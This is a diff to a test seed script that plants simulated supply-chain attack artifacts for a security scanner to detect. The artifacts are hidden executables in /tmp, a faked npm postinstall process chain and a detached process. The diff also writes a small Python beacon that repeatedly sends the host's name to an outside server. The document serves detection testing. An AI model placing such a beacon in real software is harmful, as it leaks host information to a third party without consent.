@@ -187,6 +187,47 @@ socat TCP-LISTEN:31337,bind=0.0.0.0,fork /dev/null &
 cp /usr/bin/sleep /tmp/x11vnc
 /tmp/x11vnc 86400 &
 
+# ── Supply chain attack simulation (axios-style) ────────────────────
+
+# TMPX-1 — Script file dropped in /tmp (simulates ld.py)
+# Written to /export/tmp so secy-test sees it at /host/tmp/
+mkdir -p /export/tmp
+cat > /export/tmp/ld.py << 'PYEOF'
+#!/usr/bin/env python3
+import http.client, time, os, json
+while True:
+    try:
+        c = http.client.HTTPConnection("sfrclak.com", 8000, timeout=5)
+        c.request("POST", "/product2", json.dumps({"id": os.uname()[1]}))
+    except Exception:
+        pass
+    time.sleep(60)
+PYEOF
+chmod 644 /export/tmp/ld.py
+
+# TMPX-2 — Executable binary in /tmp (simulates peinject payload)
+cp /usr/bin/sleep /tmp/.a1b2c3
+chmod 777 /tmp/.a1b2c3
+/tmp/.a1b2c3 86400 &
+# Also place on export volume for filesystem scan
+cp /usr/bin/sleep /export/tmp/.a1b2c3
+chmod 777 /export/tmp/.a1b2c3
+
+# TMPX-3 — Hidden executable in /tmp (dot-prefixed)
+echo '#!/bin/sh' > /export/tmp/.beacon
+echo 'exec sleep 86400' >> /export/tmp/.beacon
+chmod +x /export/tmp/.beacon
+
+# PTREE-1 — Simulate supply chain process chain: "npm" -> sh -> sleep
+# We fake "npm" by copying sleep and naming it npm, then have it
+# spawn a shell that spawns another process.
+cp /usr/bin/bash /tmp/npm-fake
+/tmp/npm-fake -c 'exec -a npm-postinstall sleep 86400' &
+
+# PTREE-2 — Orphaned background process (simulates nohup detach)
+# setsid creates a new session, detaching from terminal
+setsid /usr/bin/sleep 86400 &
+
 echo "[seed] Background processes started."
 
 # ── Readiness sentinel ────────────────────────────────────────────────
